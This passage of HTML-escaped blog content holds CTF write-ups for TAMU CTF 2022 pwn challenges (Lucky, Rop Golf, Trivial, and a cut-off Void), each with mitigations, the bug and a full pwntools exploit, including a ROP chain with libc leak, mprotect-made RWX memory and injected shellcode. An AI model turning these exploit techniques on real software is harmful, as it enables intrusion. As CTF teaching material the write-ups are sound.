class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;ctf-sim&quot;)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    Partial RELRO</span><br><span class="line">#    Stack:    No canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">win_addr = exe.symbols[&quot;win_addr&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Quit\n&gt; &quot;,b&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(b&quot;Crypto\n&gt; &quot;,b&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(b&quot;(0-3)\n&gt; &quot;,b&#x27;0&#x27;)</span><br><span class="line">io.sendlineafter(b&quot;Quit\n&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(b&quot;(0-3)\n&gt; &quot;,b&#x27;0&#x27;)</span><br><span class="line">io.sendlineafter(b&quot;Quit\n&gt; &quot;,b&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(b&quot;writeup?\n&gt; &quot;,b&#x27;16&#x27;)</span><br><span class="line">io.sendlineafter(b&quot;writeup\n&gt; &quot;,flat(&#123;0:win_addr&#125;))</span><br><span class="line">io.sendlineafter(b&quot;Quit\n&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(b&quot;(0-3)\n&gt; &quot;,b&#x27;0&#x27;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>gigem{h34pl355_1n_53477l3}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] Lucky [Tamu CTF 2022]</title>
    <url>/ctf-writeup/2022/tamuctf/pwn/lucky/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Author: nhwn</p>
<p>Feeling lucky? I have just the challenge for you :D</p>
<p>SNI: lucky</p>
<p>files: <a href="lucky">lucky</a>, <a href="lucky.c">lucky.c</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>The basic idea is set a seed for <code>rand()</code> so that 3 key is same as the requirements.</p>
<p>Because both function are called in the main. The function <code>seed()</code> and function <code>welcome</code> share the same stack address. </p>
<p>On the other hand, <code>seed()</code> just return the value on the stack. In this case, the stack will looks like this.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stack for welcome         stack for seed</span><br><span class="line">-------                   -----------------  </span><br><span class="line">buf[4]</span><br><span class="line">buf[8]                    &quot;GLHF :D&quot;</span><br><span class="line">buf[4]                    lol</span><br><span class="line">main stack                main stack</span><br><span class="line">-------                   ---------------</span><br></pre></td></tr></table></figure>

<p>Therefore, we can control the value of lol (which is the seed) by write last 4 bytes in function <code>welcome</code>&#x2F;</p>
<p>now, we just need to find the correct seed by using the script below</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    for (int i = 0; i &lt;= 2147483647; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        srand(i);</span><br><span class="line">        int key0 = rand() == 306291429;</span><br><span class="line">        int key1 = rand() == 442612432;</span><br><span class="line">        int key2 = rand() == 110107425;</span><br><span class="line">        if (key0 &amp;&amp; key1 &amp;&amp; key2)</span><br><span class="line">        &#123;</span><br><span class="line">            printf(&quot;%d&quot;,i);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = ELF(&quot;lucky&quot;)</span><br><span class="line">io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;lucky&quot;)</span><br><span class="line">io.sendlineafter(&#x27;name: &#x27;,flat(&#123;</span><br><span class="line">    0xc:5649426</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>gigem{un1n1t14l1z3d_m3m0ry_15_r4nd0m_r1ght}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] Rop Golf [Tamu CTF 2022]</title>
    <url>/ctf-writeup/2022/tamuctf/pwn/rop_golf/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Author: sky</p>
<p>I keep on getting hacked by people using my shells! Now that I&#39;ve deleted all the nonessential programs off my computer I should be safe... right?</p>
<p>The flag is in a *.txt file with a randomly generated name inside the same directory as the binary.</p>
<p>SNI: rop-golf</p>
<p>files: <a href="rop_golf">rop_golf</a>, <a href="rop_golf.c">rop_golf.c</a>, glibc 2.28</p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>looking at the binary, the binary is contains a very simple buffer overflow vulnerability in funtion <code>vuln</code>. So in total, we have 72 -32 -8 &#x3D; 32 bytes for buffer overflow.</p>
<p>We can do 4 rop operation.</p>
<p>However, the challenge server remove all the binary under <code>/bin</code>, <code>/usr/bin/</code>... So we are not able get a shell using <code>system(&#39;/bin/sh&#39;)</code>. </p>
<p>So, In order to read the flag, we need to first manually do a <code>ls</code> to see what is flag name. Secondly, use <code>open</code>, <code>read</code>, <code>write</code> syscall to read the flag file and output to stdout.</p>
<p>Here is one way of manually doing <code>ls</code>, <a href="https://www.gnu.org/software/libc/manual/html_node/Simple-Directory-Lister.html">https://www.gnu.org/software/libc/manual/html_node&#x2F;Simple-Directory-Lister.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void vuln() &#123;</span><br><span class="line">    char buf[32];</span><br><span class="line">    read(0, buf, 72);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Here is my solution</p>
<ol>
<li>In the first rop chain, using puts to leak libc address and return back to <code>vuln</code></li>
<li>In the second rop chain, use <code>pop rdx; ret</code>, <code>0x200</code>, <code>read addr</code>. So that I can write 0x200 more data on the stack and construct a larger rop chain. (I can do stack pivot here but im kind of lazy to do that)</li>
<li>In the third rop chain, which is now 0x200 bytes long. I first do <code>mprotect</code> on some memory pages so that i could put shellcode and gadgets on it. Then, i call <code>read</code> again to write shellcodes and essential gadgets into the memory page. Finally, I use rop chain to do a manually <code>ls</code> and read the flag.</li>
</ol>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;rop_golf_patched&quot;</span><br><span class="line">    libc = &quot;libc.so.6&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;rua.host.goes.here&quot;</span><br><span class="line">    port = 8000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;rop-golf&quot;)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">    # Arch:     amd64-64-little</span><br><span class="line">    # RELRO:    Partial RELRO</span><br><span class="line">    # Stack:    No canary found</span><br><span class="line">    # NX:       NX enabled</span><br><span class="line">    # PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def int2byte(x: int):</span><br><span class="line">    return x.to_bytes(exe.bytes, &quot;little&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def wait_for_debugger(io):</span><br><span class="line">    if args.LOCAL and input(&quot;debugger?&quot;) == &quot;y\n&quot;:</span><br><span class="line">        pid = util.proc.pidof(io)[0]</span><br><span class="line">        log_print(&quot;The pid is: &quot; + str(pid))</span><br><span class="line">        util.proc.wait_for_debugger(pid)</span><br><span class="line">        log_print(&quot;press enter to continue&quot;)</span><br><span class="line"></span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line">pop_rdi_ret_addr = exe_rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">wait_for_debugger(io)</span><br><span class="line"></span><br><span class="line">writable_addr = 0x0000000000404800</span><br><span class="line"></span><br><span class="line">rop_1 = flat(&#123;</span><br><span class="line">    32: b&#x27;00000000&#x27;,</span><br><span class="line">    32+8: [</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        exe.got[&#x27;puts&#x27;],</span><br><span class="line">        exe.sym[&quot;puts&quot;],</span><br><span class="line">        exe.sym[&quot;vuln&quot;]</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">log_print(&quot;pop rdi ret&quot;,hex(pop_rdi_ret_addr))</span><br><span class="line"></span><br><span class="line">io.sendafter(b&quot;hi!\n&quot;,rop_1)</span><br><span class="line">puts_addr = int.from_bytes(io.recvuntil(b&#x27;\n&#x27;,drop=True),&quot;little&quot;)</span><br><span class="line">log_print(&quot;puts addr&quot;,hex(puts_addr))</span><br><span class="line">libc_base_addr = puts_addr - libc.sym[&quot;puts&quot;]</span><br><span class="line">log_print(&quot;libc base addr&quot;,hex(libc_base_addr))</span><br><span class="line"></span><br><span class="line">log_print(next(libc.search(b&quot;%p\0&quot;)))</span><br><span class="line">log_print(&quot;bin sh&quot;,hex(libc_base_addr + next(libc.search(b&quot;.\0&quot;))))</span><br><span class="line"></span><br><span class="line">log_print(libc.sym[&quot;opendir&quot;])</span><br><span class="line"></span><br><span class="line">log_print(&quot;mprotect&quot;,libc.sym[&quot;mprotect&quot;])</span><br><span class="line"></span><br><span class="line">pop_rsi_ret_addr = libc_base_addr + libc_rop.find_gadget([&#x27;pop rsi&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line">pop_rdx_ret_addr = libc_base_addr + libc_rop.find_gadget([&#x27;pop rdx&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line">leave_ret_addr = libc_base_addr + libc_rop.find_gadget([&#x27;leave&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line">mov_rdx_rax_ret_addr = libc_base_addr + 0x0000000000115dff</span><br><span class="line">push_rdx_ret_addr = libc_base_addr + 0x0000000000117171</span><br><span class="line">add_rax_1_ret_addr = libc_base_addr + 0x00000000000b4a00</span><br><span class="line">add_rax_3_ret_addr = libc_base_addr + 0x00000000000b4a10</span><br><span class="line"></span><br><span class="line">log_print(&quot;pop rsi ret&quot;,hex(pop_rsi_ret_addr))</span><br><span class="line">log_print(&quot;pop rdx ret&quot;,hex(pop_rdx_ret_addr))</span><br><span class="line">log_print(&quot;leave ret&quot;,hex(leave_ret_addr))</span><br><span class="line"></span><br><span class="line">rop_2 = flat(&#123;</span><br><span class="line">    32+8: [</span><br><span class="line">        pop_rdx_ret_addr,</span><br><span class="line">        0x200,</span><br><span class="line">        exe.sym[&quot;read&quot;],</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line">io.send(rop_2)</span><br><span class="line">shellcode_mov_rdi_rax_ret = asm(shellcraft.mov(&quot;rdi&quot;,&quot;rax&quot;))+asm(shellcraft.ret())</span><br><span class="line">mov_rdi_rax_ret_addr = writable_addr</span><br><span class="line"></span><br><span class="line">shellcode_mov_r15_rdi_ret = asm(shellcraft.mov(&quot;r15&quot;,&quot;rdi&quot;))+asm(shellcraft.ret())</span><br><span class="line">mov_r15_rdi_ret_addr = mov_rdi_rax_ret_addr + len(shellcode_mov_rdi_rax_ret)</span><br><span class="line"></span><br><span class="line">shellcode_mov_rdi_r15_ret = asm(shellcraft.mov(&quot;rdi&quot;,&quot;r15&quot;))+asm(shellcraft.ret())</span><br><span class="line">mov_rdi_r15_ret_addr = mov_r15_rdi_ret_addr + len(shellcode_mov_r15_rdi_ret)</span><br><span class="line"></span><br><span class="line">shellcode_add_rax_19_ret = bytes.fromhex(&quot;4883c013c3&quot;)</span><br><span class="line">add_rax_19_ret_addr = mov_rdi_r15_ret_addr + len(shellcode_mov_rdi_r15_ret)</span><br><span class="line"></span><br><span class="line">shellcode_read_file = b&#x27;&#x27;.join([</span><br><span class="line">    asm(shellcraft.read(0, writable_addr+0x100, 100)),</span><br><span class="line">    asm(shellcraft.open(writable_addr+0x100, 0)),</span><br><span class="line">    asm(shellcraft.read(&#x27;rax&#x27;, writable_addr+0x100, 100)),</span><br><span class="line">    asm(shellcraft.write(1, writable_addr+0x100, 100))])</span><br><span class="line"></span><br><span class="line">read_file_addr = add_rax_19_ret_addr + len(shellcode_add_rax_19_ret)</span><br><span class="line"></span><br><span class="line">flag_file_name = b&quot;066A2462DEB399BA9183A91FC116914C.txt&quot;</span><br><span class="line"></span><br><span class="line"># log_print(hex(mov_rdi_rax_ret_addr),hex(mov_rdx_rdi_ret_addr),hex(mov_rdi_rdx_ret_addr))</span><br><span class="line">final_shellcodes = shellcode_mov_rdi_rax_ret+shellcode_mov_r15_rdi_ret+shellcode_mov_rdi_r15_ret + shellcode_add_rax_19_ret + shellcode_read_file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop_3 = flat(&#123;</span><br><span class="line">    32+8: [</span><br><span class="line">        b&#x27;AAAAAAAA&#x27;,</span><br><span class="line">        b&#x27;BBBBBBBB&#x27;,</span><br><span class="line">        b&#x27;CCCCCCCC&#x27;,</span><br><span class="line">        # make it rwx</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        0x0000000000404000,</span><br><span class="line">        pop_rsi_ret_addr,</span><br><span class="line">        0x1000,</span><br><span class="line">        pop_rdx_ret_addr,</span><br><span class="line">        1|2|4,</span><br><span class="line">        libc_base_addr + libc.sym[&quot;mprotect&quot;],</span><br><span class="line">        # writing some gadget</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        0,</span><br><span class="line">        pop_rsi_ret_addr,</span><br><span class="line">        writable_addr,</span><br><span class="line">        pop_rdx_ret_addr,</span><br><span class="line">        0x100,</span><br><span class="line">        exe.sym[&quot;read&quot;],</span><br><span class="line">        # print first filename</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        libc_base_addr + next(libc.search(b&quot;.\0&quot;)),</span><br><span class="line">        libc_base_addr + libc.sym[&quot;opendir&quot;],</span><br><span class="line">        mov_rdi_rax_ret_addr,</span><br><span class="line">        mov_r15_rdi_ret_addr,</span><br><span class="line">        libc_base_addr + libc.sym[&quot;readdir&quot;],</span><br><span class="line">        add_rax_19_ret_addr,</span><br><span class="line">        mov_rdi_rax_ret_addr,</span><br><span class="line">        exe.sym[&quot;puts&quot;],</span><br><span class="line">        mov_rdi_r15_ret_addr,</span><br><span class="line">        libc_base_addr + libc.sym[&quot;readdir&quot;],</span><br><span class="line">        add_rax_19_ret_addr,</span><br><span class="line">        mov_rdi_rax_ret_addr,</span><br><span class="line">        exe.sym[&quot;puts&quot;],</span><br><span class="line">        mov_rdi_r15_ret_addr,</span><br><span class="line">        libc_base_addr + libc.sym[&quot;readdir&quot;],</span><br><span class="line">        add_rax_19_ret_addr,</span><br><span class="line">        mov_rdi_rax_ret_addr,</span><br><span class="line">        exe.sym[&quot;puts&quot;],</span><br><span class="line">        mov_rdi_r15_ret_addr,</span><br><span class="line">        libc_base_addr + libc.sym[&quot;readdir&quot;],</span><br><span class="line">        add_rax_19_ret_addr,</span><br><span class="line">        mov_rdi_rax_ret_addr,</span><br><span class="line">        exe.sym[&quot;puts&quot;],</span><br><span class="line">        # mov_rdi_r15_ret_addr,</span><br><span class="line">        # libc_base_addr + libc.sym[&quot;readdir&quot;],</span><br><span class="line">        # add_rax_19_ret_addr,</span><br><span class="line">        # mov_rdi_rax_ret_addr,</span><br><span class="line">        # exe.sym[&quot;puts&quot;],</span><br><span class="line">        read_file_addr</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"># input(&quot;asdf&quot;)</span><br><span class="line">io.send(rop_3)</span><br><span class="line"># input(&quot;writing gadgets&quot;)</span><br><span class="line">io.send(final_shellcodes)</span><br><span class="line"># input(&quot;lol&quot;)</span><br><span class="line">log_print(&quot;filenames&quot;,io.recv())</span><br><span class="line">io.send(flag_file_name)</span><br><span class="line">log_print(io.recv())</span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>gigem{r34lly_p1v071n6_7h47_574ck}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] Trivial [Tamu CTF 2022]</title>
    <url>/ctf-writeup/2022/tamuctf/pwn/trivial/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Author: nhwn</p>
<p>Feeling lucky? I have just the challenge for you :D</p>
<p>SNI: lucky</p>
<p>files: <a href="trivial">trivial</a>, <a href="trivial.c">trival.c</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>Very trivial buffer overflow in main. Overwrite rip to function win to get a shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void main() &#123;</span><br><span class="line">    char buff[69];</span><br><span class="line"></span><br><span class="line">    gets(buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = ELF(&quot;trivial&quot;)</span><br><span class="line"></span><br><span class="line">p = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;trivial&quot;)</span><br><span class="line">p.sendline(flat(&#123;</span><br><span class="line">    0x50+0x8:[</span><br><span class="line">        0x00401132</span><br><span class="line">    ]</span><br><span class="line">&#125;))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>gigem{sorry_for_using_the_word_trivial}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] Void [Tamu CTF 2022]</title>
    <url>/ctf-writeup/2022/tamuctf/pwn/void/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Author: sky</p>
<p>Can&#39;t exploit it if there isn&#39;t anything to exploit, right? NX, no libc, what else even can you do?!</p>
<p>SNI: void</p>
<p>files: <a href="void">void</a>, <a href="void.c">void.c</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>This is a <strong>SROP</strong> challenge. </p>
<p>In order to call <code>syscall(59,&#39;/bin/sh&#39;,0,0)</code>, we need find a writable memory page to write our string at. But the binary itself does not have a writable region except stack.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000400000 - 0x0000000000401000 - usr     4K s r-- segment.ehdr</span><br><span class="line">0x0000000000401000 - 0x0000000000402000 * usr     4K s r-x map.void.r_x</span><br><span class="line">0x0000000000402000 - 0x0000000000403000 - usr     4K s r-- map.void.r__</span><br><span class="line">0x00007ffc84ce8000 - 0x00007ffc84d09000 - usr   132K s rw- [stack] [stack] ; map._stack_.rw_</span><br><span class="line">0x00007ffc84d13000 - 0x00007ffc84d17000 - usr    16K s r-- [vvar] [vvar] ; map._vvar_.r__</span><br><span class="line">0x00007ffc84d17000 - 0x00007ffc84d18000 - usr     4K s r-x [vdso] [vdso] ; map._vdso_.r_x</span><br></pre></td></tr></table></figure>

<p>However, their is no way we can output the stack address using <code>write</code>, since <code>rdi</code> never set to 1 (<code>stdout</code>).</p>
<p>Therefore, we need to use <code>mprotect</code> to create an <code>rwx</code> memory page so that we can write stack or put shellcode on.</p>
<p>To do that, we also need to set <code>rsp</code> to a address on the memory space which point back to the instructions. So when <code>ret</code> is called, it will go back to the executable instruction.</p>
<p>luckily, in <code>0x004020b8</code>, there is address that point back to <code>main</code>. So we can happily point rsp to there and make whole <code>0x00402000-0x00403000</code> page writable. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x004020b8 0x0000000000401000   ..@..... 4198400 /home/aynakeya/ctf/tamuctf2022/void/void .text main,section..text,segment.LOAD1,.text,main,map._home_aynakeya_ctf_tamuctf2022_void_void.r_x main program R X &#x27;mov rax, 0&#x27; &#x27;void&#x27;</span><br><span class="line">0x004020c0 ..[ null bytes ]..   00000000</span><br><span class="line">0x004020c8 0x0003000300000000   ........</span><br></pre></td></tr></table></figure>

<p>After that, we can continue do another sigreturn there and execute <code>execve(&quot;/bin/sh&quot;)</code> to get shell.</p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;void&quot;</span><br><span class="line">    libc = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;rua.host.goes.here&quot;</span><br><span class="line">    port = 8000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;void&quot;)</span><br><span class="line">    if args.GDB:</span><br><span class="line"> 